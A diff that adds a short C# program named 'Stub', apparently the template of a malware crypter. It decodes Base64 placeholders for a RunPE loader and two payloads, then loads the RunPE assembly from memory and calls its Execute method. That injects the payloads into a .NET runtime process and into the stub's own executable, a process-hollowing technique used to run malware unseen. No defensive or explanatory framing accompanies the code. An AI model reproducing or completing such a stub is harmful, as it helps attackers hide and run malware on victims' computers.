@@ -1,0 +1,39 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace Stub
+{
+    class Program
+    {
+        static void Main()
+        {
+
+            byte[] Runpe = Convert.FromBase64String("%RUNPE%");
+            byte[] Payload = Convert.FromBase64String("%PAYLOAD%");
+            byte[] Payload2 = Convert.FromBase64String("%PAYLOAD2%");
+            string InjectionPath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "%PROCESS%");
+            string InjectionPath2 = (System.Reflection.Assembly.GetEntryAssembly().Location);
+
+            if (Runpe.Length > 0 && Payload.Length > 0)
+            {
+
+                Assembly RunpeLoader = Assembly.Load(Runpe);
+                MethodInfo MI = RunpeLoader.GetType("Runpe.Class1").GetMethod("Execute");
+                object[] Params = new object[] { InjectionPath, Payload };
+
+                MI.Invoke(null, Params);
+
+                Assembly RunpeLoader2 = Assembly.Load(Runpe);
+                MethodInfo MI2 = RunpeLoader.GetType("Runpe.Class1").GetMethod("Execute");
+                object[] Params2 = new object[] { InjectionPath2, Payload2 };
+
+                MI2.Invoke(null, Params2);
+
+            }
+        }
+    }
+}
